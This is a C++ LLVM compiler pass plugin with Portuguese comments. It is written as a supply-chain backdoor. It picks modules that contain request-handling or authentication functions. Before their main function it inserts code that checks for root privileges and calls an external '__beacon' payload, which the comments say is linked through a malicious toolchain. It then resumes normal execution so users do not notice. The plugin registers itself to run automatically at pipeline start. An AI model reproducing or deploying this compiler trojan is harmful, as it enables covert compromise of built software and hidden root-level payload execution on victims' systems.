#include "llvm/Passes/PassBuilder.h"
#include "llvm/Passes/PassPlugin.h"
#include "llvm/IR/IRBuilder.h"
#include "llvm/IR/Module.h"

using namespace llvm;

struct SelectiveBeacon : PassInfoMixin<SelectiveBeacon> {
    PreservedAnalyses run(Module &M, ModuleAnalysisManager &) {
        LLVMContext &Ctx = M.getContext();
        IRBuilder<> B(Ctx);

        // --- 1. TARGET DISCOVERY (RECONHECIMENTO DE ALVO) ---
        // Não queremos infectar todo e qualquer binário. Buscamos módulos que 
        // manipulem requisições ou autenticação, onde o impacto é maior.
        bool hasHighValueTarget = false;
        for (auto &F : M) {
            StringRef Name = F.getName();
            if (Name.contains("handle_request") || Name.contains("auth_verify")) {
                hasHighValueTarget = true;
                break;
            }
        }

        // Se o módulo não parecer ser um alvo de produção, saímos sem alterar nada.
        if (!hasHighValueTarget) return PreservedAnalyses::all();

        // Localiza a função principal. Se não houver main (ex: uma lib), ignoramos.
        Function *Main = M.getFunction("main");
        if (!Main || Main->empty()) return PreservedAnalyses::all();

        // --- 2. DEFINIÇÃO DE ARTEFATOS EXTERNOS ---
        // getuid: syscall padrão para checar o ID do usuário (UID 0 = root no Linux).
        FunctionCallee GetUID = M.getOrInsertFunction(
            "getuid", FunctionType::get(B.getInt32Ty(), false));
        
        // __beacon: O nosso payload externo que será linkado via toolchain maliciosa.
        FunctionCallee Beacon = M.getOrInsertFunction(
            "__beacon", FunctionType::get(B.getVoidTy(), false));

        // --- 3. REESTRUTURAÇÃO DO GRAFO DE FLUXO DE CONTROLE (CFG) ---
        // O segredo aqui é o 4º argumento de BasicBlock::Create: 'OrigEntry'.
        // Isso força o LLVM a inserir nossos blocos ANTES do bloco original.
        BasicBlock *OrigEntry = &Main->getEntryBlock();
        
        // uid_check: Bloco que decide se o ataque deve ocorrer.
        BasicBlock *CheckBB  = BasicBlock::Create(Ctx, "uid_check",   Main, OrigEntry);
        // beacon_fire: Bloco que contém a execução do nosso artefato.
        BasicBlock *BeaconBB = BasicBlock::Create(Ctx, "beacon_fire", Main, OrigEntry);

        // --- 4. CONSTRUÇÃO DA LÓGICA DE DECISÃO (uid_check) ---
        B.SetInsertPoint(CheckBB);
        Value *UID = B.CreateCall(GetUID);
        
        // Compara se o UID de runtime é igual a 0 (Sinal de privilégio elevado).
        Value *IsRoot = B.CreateICmpEQ(UID, B.getInt32(0));
        
        // Desvio Condicional: 
        // Se for Root -> Salta para 'beacon_fire'
        // Se não for -> Salta direto para o 'entry' original (transparência total)
        B.CreateCondBr(IsRoot, BeaconBB, OrigEntry);

        // --- 5. CONSTRUÇÃO DO DISPARO (beacon_fire) ---
        B.SetInsertPoint(BeaconBB);
        B.CreateCall(Beacon);
        
        // Após o beacon rodar, precisamos retornar ao fluxo legítimo do programa.
        // O usuário nunca saberá que o beacon executou antes do main dele.
        B.CreateBr(OrigEntry);

        // Como alteramos a estrutura do grafo (CFG), invalidamos as análises anteriores.
        return PreservedAnalyses::none();
    }
};

// --- REGISTRO DO PLUGIN ---
// Boilerplate necessário para que o Clang reconheça e carregue este .so como um pass.
extern "C" LLVM_ATTRIBUTE_WEAK ::llvm::PassPluginLibraryInfo
llvmGetPassPluginInfo() {
    return {LLVM_PLUGIN_API_VERSION, "SelectiveBeacon", LLVM_VERSION_STRING,
            [](PassBuilder &PB) {
                PB.registerPipelineStartEPCallback(
                    [](ModulePassManager &MPM, OptimizationLevel Level) {
                        MPM.addPass(SelectiveBeacon());
                    });
            }};
}
